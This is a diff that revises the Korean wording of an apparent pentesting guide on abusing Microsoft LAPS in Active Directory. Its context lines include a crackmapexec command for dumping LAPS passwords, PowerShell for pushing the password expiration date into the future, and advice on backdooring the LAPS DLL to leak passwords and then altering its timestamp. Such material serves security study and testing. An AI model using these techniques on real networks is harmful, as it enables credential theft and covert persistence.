@@ -85,7 +85,7 @@ DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
 ## **Dumping LAPS Passwords With Crackmapexec**
 
-powershell에 접근할 수 없는 경우, LDAP를 사용하여 이 권한을 원격으로 악용할 수 있습니다.
+powershell에 접근할 수 없는 경우 LDAP를 통해 이 권한을 원격으로 악용할 수 있습니다.
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
@@ -103,7 +103,7 @@ Password: 2Z@Ae)7!{9#Cq
 
 ### **만료 날짜**
 
-관리자가 되면, **비밀번호를 얻고** **비밀번호 업데이트를 방지**하기 위해 **만료 날짜를 미래로 설정**하는 것이 가능합니다.
+관리자가 되면, **비밀번호를 얻고** **비밀번호 업데이트를 방지**하기 위해 **만료 날짜를 미래로 설정**할 수 있습니다.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -117,7 +117,7 @@ Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="2326099
 
 ### 백도어
 
-LAPS의 원본 소스 코드는 [여기](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으므로, 코드에 백도어를 삽입하는 것이 가능합니다 (예: `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부) 이 백도어는 어떤 식으로든 **새 비밀번호를 유출하거나 어딘가에 저장**할 수 있습니다.
+LAPS의 원본 소스 코드는 [여기](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으며, 따라서 코드에 백도어를 삽입하는 것이 가능합니다 (예: `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부) 이는 어떤 식으로든 **새 비밀번호를 유출하거나 어딘가에 저장**할 수 있습니다.
 
 그런 다음, 새로운 `AdmPwd.PS.dll`을 컴파일하고 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`에 업로드합니다 (그리고 수정 시간을 변경합니다).
 
